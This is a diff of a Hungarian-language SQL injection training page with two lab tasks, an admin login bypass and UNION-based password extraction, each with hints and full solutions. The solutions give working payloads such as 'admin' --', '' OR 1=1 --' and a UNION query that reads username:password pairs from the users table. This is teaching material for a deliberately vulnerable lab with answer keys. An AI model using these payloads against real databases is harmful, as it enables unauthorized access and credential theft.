@@ -372,22 +372,27 @@
                 </nav>
             </div>
 
-            <!-- Feladat 1 -->
+            <!-- Feladat 1 — Auth bypass -->
             <section id="task1Section" class="sub-section active">
                 <div class="hero-card">
                     <div>
-                        <h2>Feladat 1</h2>
-                        <p></p>
+                        <h2>Feladat 1 — Belépés</h2>
+                        <p>Lépj be <strong>admin-ként</strong>, de <em>anélkül hogy ismernéd az admin jelszavát</em>. A login form tipikus felhasználónév + jelszó ellenőrzést végez, viszont sérülékeny lekérdezéssel.</p>
                     </div>
                 </div>
 
                 <section class="control-panel">
                     <div class="field flex-grow">
-                        <label for="task1Input">Bemenet</label>
-                        <input type="text" id="task1Input" placeholder="Ide jön a payload">
+                        <label for="task1User">Felhasználónév</label>
+                        <input type="text" id="task1User">
                     </div>
 
-                    <button id="task1Btn">Beküldés</button>
+                    <div class="field flex-grow">
+                        <label for="task1Pass">Jelszó</label>
+                        <input type="text" id="task1Pass">
+                    </div>
+
+                    <button id="task1Btn">Belépés</button>
                 </section>
 
                 <div class="status-bar" id="task1Status">Várakozás...</div>
@@ -398,7 +403,7 @@
                             <h3>Eredmény</h3>
                         </div>
                         <div class="panel-body">
-                            <div id="task1Result" class="result-box">Itt fog megjelenni a feladat eredménye.</div>
+                            <div id="task1Result" class="result-box">Próbálj meg belépni admin-ként.</div>
                         </div>
                     </section>
 
@@ -409,33 +414,36 @@
                         <div class="panel-body" id="task1Help">
                             <details class="task-help">
                                 <summary>Segítség</summary>
-                                <p></p>
+                                <p>Az SQL-ben a <code>--</code> sor-kommentet jelent: az utána jövő rész a szerveren elveszik. Ha a felhasználónév mezőbe olyan szöveget írsz, ami <em>befejezi</em> a query string-literált és <em>kikommentezi</em> a többit, a jelszó-ellenőrzés átugorható.</p>
+                                <p>Próbálj meg úgy gondolni a query-re, mintha te magad írnád: <code>WHERE username = '???' AND password = 'bármi'</code>. Mit írhatnál a <code>???</code> helyére, hogy az AND password rész már ne számítson?</p>
                             </details>
                             <details class="task-help">
                                 <summary>Megoldás</summary>
-                                <p></p>
+                                <p>Felhasználónév: <code>admin' --</code> (a <code>--</code> után <strong>egy szóköz kell</strong>!)<br>Jelszó: <code>bármi</code></p>
+                                <p>A konstruált SQL így néz ki: <code>SELECT id, username, role FROM users WHERE username = 'admin' -- ' AND password = 'bármi'</code>. A <code>--</code> kikommentezi az AND password ellenőrzést, így a query simán matchel az admin user-re.</p>
+                                <p>Egy másik klasszikus változat: felhasználónév <code>' OR 1=1 --</code>, ami az első találatot adja vissza (általában a legkisebb ID-jú user-t — ez itt az admin).</p>
                             </details>
                         </div>
                     </section>
                 </div>
             </section>
 
-            <!-- Feladat 2 -->
+            <!-- Feladat 2 — UNION-based extraction -->
             <section id="task2Section" class="sub-section">
                 <div class="hero-card">
                     <div>
-                        <h2>Feladat 2</h2>
-                        <p></p>
+                        <h2>Feladat 2 — UNION-based adatkinyerés</h2>
+                        <p>Egy nyilvános termékkereső oszlopokat ad vissza. A háttérben azonban van egy másik tábla (<code>users</code>), amiben a felhasználónevek és jelszavak szerepelnek. <strong>Lopd ki az admin jelszavát</strong> a kereső segítségével.</p>
                     </div>
                 </div>
 
                 <section class="control-panel">
                     <div class="field flex-grow">
-                        <label for="task2Input">Bemenet</label>
-                        <input type="text" id="task2Input" placeholder="Ide jön a payload">
+                        <label for="task2Input">Keresés</label>
+                        <input type="text" id="task2Input">
                     </div>
 
-                    <button id="task2Btn">Beküldés</button>
+                    <button id="task2Btn">Keresés</button>
                 </section>
 
                 <div class="status-bar" id="task2Status">Várakozás...</div>
@@ -443,10 +451,23 @@
                 <div class="dashboard-grid">
                     <section class="panel panel-large">
                         <div class="panel-header">
-                            <h3>Eredmény</h3>
+                            <h3>Találatok</h3>
                         </div>
                         <div class="panel-body">
-                            <div id="task2Result" class="result-box">Itt fog megjelenni a feladat eredménye.</div>
+                            <table>
+                                <thead>
+                                <tr>
+                                    <th>Név</th>
+                                    <th>Ár</th>
+                                </tr>
+                                </thead>
+                                <tbody id="task2ResultsBody">
+                                <tr>
+                                    <td colspan="2" class="empty">Még nincs keresés.</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                            <div id="task2Result" class="result-box" style="margin-top: 12px;">Konstruált SQL itt fog megjelenni.</div>
                         </div>
                     </section>
 
@@ -456,12 +477,25 @@
                         </div>
                         <div class="panel-body" id="task2Help">
                             <details class="task-help">
-                                <summary>Segítség</summary>
-                                <p></p>
+                                <summary>Segítség 1 — oszlop-szám</summary>
+                                <p>A UNION csak akkor működik, ha a két SELECT <strong>ugyanannyi oszlopot</strong> ad vissza. Ezt egy <code>ORDER BY n</code> trükkel deríthetjük ki: ha <code>ORDER BY 2</code> még működik, de <code>ORDER BY 3</code> hibát dob, akkor a query 2 oszlopos.</p>
+                            </details>
+                            <details class="task-help">
+                                <summary>Segítség 2 — séma feltárás</summary>
+                                <p>H2-ben (és a legtöbb DB-ben) van egy <code>INFORMATION_SCHEMA</code>, amiből megtudhatod a táblákat és oszlopokat. Pl. <code>' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES --</code>.</p>
+                                <p>A <code>users</code> tábla biztosan létezik, és van benne <code>username</code> + <code>password</code> oszlop.</p>
+                            </details>
+                            <details class="task-help">
+                                <summary>Segítség 3 — típus-kompatibilitás</summary>
+                                <p>A UNION-nal egyesített query-knek nem csak <em>oszlopszámban</em>, hanem <em>típusban</em> is illeszkedniük kell. A <code>products.price</code> <code>DOUBLE</code>, a <code>users.password</code> <code>VARCHAR</code> — ezeket nem lehet közvetlenül UNION-olni. Vagy egy <code>NULL</code>-t (ami minden típusra kompatibilis) tegyél a második oszlopba, vagy fűzd össze a username + password szöveget egyetlen oszlopba.</p>
                             </details>
                             <details class="task-help">
                                 <summary>Megoldás</summary>
-                                <p></p>
+                                <p>A naív payload (<code>' UNION SELECT username, password FROM users -- </code>) hibára fut, mert a <code>password</code> VARCHAR, a <code>price</code> DOUBLE — a UNION nem tudja egyesíteni őket.</p>
+                                <p>Egyik bevált változat — a username + password összefűzve az első (VARCHAR) oszlopba, a második oszlopba 0:</p>
+                                <p><code>' UNION SELECT username || ':' || password, 0 FROM users -- </code></p>
+                                <p>Konstruált query: <code>SELECT name, price FROM products WHERE name LIKE '%' UNION SELECT username || ':' || password, 0 FROM users --  %'</code></p>
+                                <p>A találati táblában a termékek mellett megjelennek a userek <code>admin:S3cretAdminP@ss</code> formátumban.</p>
                             </details>
                         </div>
                     </section>
